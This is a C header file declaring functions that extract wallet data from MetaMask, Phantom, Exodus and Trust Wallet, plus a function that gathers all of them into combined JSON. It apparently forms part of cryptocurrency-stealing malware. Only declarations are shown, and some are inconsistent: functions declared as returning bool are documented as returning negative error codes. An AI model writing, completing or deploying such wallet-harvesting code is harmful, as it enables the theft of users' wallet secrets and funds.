#pragma once

#ifdef __cplusplus
extern "C" {
#endif

// Cryptocurrency Wallet Extraction Functions
// These functions extract wallet data from various crypto applications

// Buffer size constants to prevent overflow
#define CRYPTO_MIN_BUFFER_SIZE 1024        // Minimum safe buffer size
#define CRYPTO_MAX_BUFFER_SIZE (10*1024*1024)  // Maximum buffer size (10MB)
#define CRYPTO_RECOMMENDED_BUFFER_SIZE (64*1024)  // Recommended buffer size (64KB)

// Return codes
#define CRYPTO_SUCCESS 1
#define CRYPTO_ERROR_BUFFER_TOO_SMALL -1
#define CRYPTO_ERROR_INVALID_PARAMS -2
#define CRYPTO_ERROR_NO_DATA -3

/**
 * Extract MetaMask wallet data
 * @param outputBuffer Buffer to store extracted JSON data (must not be NULL)
 * @param bufferSize Size of the output buffer (must be >= CRYPTO_MIN_BUFFER_SIZE)
 * @return CRYPTO_SUCCESS if data was successfully extracted, negative error code otherwise
 * @warning Always validate bufferSize >= CRYPTO_MIN_BUFFER_SIZE before calling
 */
bool ExtractMetaMaskData(char* outputBuffer, int bufferSize);

/**
 * Extract Phantom wallet data (Solana)
 * @param outputBuffer Buffer to store extracted JSON data (must not be NULL)
 * @param bufferSize Size of the output buffer (must be >= CRYPTO_MIN_BUFFER_SIZE)
 * @return CRYPTO_SUCCESS if data was successfully extracted, negative error code otherwise
 * @warning Always validate bufferSize >= CRYPTO_MIN_BUFFER_SIZE before calling
 */
bool ExtractPhantomData(char* outputBuffer, int bufferSize);

/**
 * Extract Exodus wallet data
 * @param outputBuffer Buffer to store extracted JSON data (must not be NULL)
 * @param bufferSize Size of the output buffer (must be >= CRYPTO_MIN_BUFFER_SIZE)
 * @return CRYPTO_SUCCESS if data was successfully extracted, negative error code otherwise
 * @warning Always validate bufferSize >= CRYPTO_MIN_BUFFER_SIZE before calling
 */
bool ExtractExodusData(char* outputBuffer, int bufferSize);

/**
 * Extract Trust Wallet data
 * @param outputBuffer Buffer to store extracted JSON data (must not be NULL)
 * @param bufferSize Size of the output buffer (must be >= CRYPTO_MIN_BUFFER_SIZE)
 * @return CRYPTO_SUCCESS if data was successfully extracted, negative error code otherwise
 * @warning Always validate bufferSize >= CRYPTO_MIN_BUFFER_SIZE before calling
 */
bool ExtractTrustWalletData(char* outputBuffer, int bufferSize);

/**
 * Extract all supported crypto wallets
 * @param outputBuffer Buffer to store combined JSON data (must not be NULL)
 * @param bufferSize Size of the output buffer (must be >= CRYPTO_RECOMMENDED_BUFFER_SIZE)
 * @return number of wallets successfully extracted, negative error code on failure
 * @warning Requires larger buffer due to combined data from multiple wallets
 */
int ExtractAllCryptoWallets(char* outputBuffer, int bufferSize);

#ifdef __cplusplus
}
#endif